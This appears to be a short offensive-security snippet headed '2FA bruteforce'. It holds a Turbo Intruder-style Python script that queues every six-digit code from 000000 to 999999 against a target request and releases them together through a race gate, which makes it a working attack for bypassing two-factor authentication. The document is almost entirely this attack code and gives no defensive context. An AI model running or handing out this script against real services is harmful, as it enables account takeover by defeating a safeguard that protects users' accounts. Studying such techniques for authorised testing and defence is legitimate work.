## 2FA bruteforce:
```
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1000000,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for num in range(0, 1000000):
	      mfa_code = '{0:06}'.format(num)
	      engine.queue(target.req, mfa_code.rstrip(), gate='race1')

    # wait until every 'race1' tagged request is ready
    # then send the final byte of each request
    # (this method is non-blocking, just like queue)
    engine.openGate('race1')

    engine.complete(timeout=60)


def handleResponse(req, interesting):
    table.add(req)

```
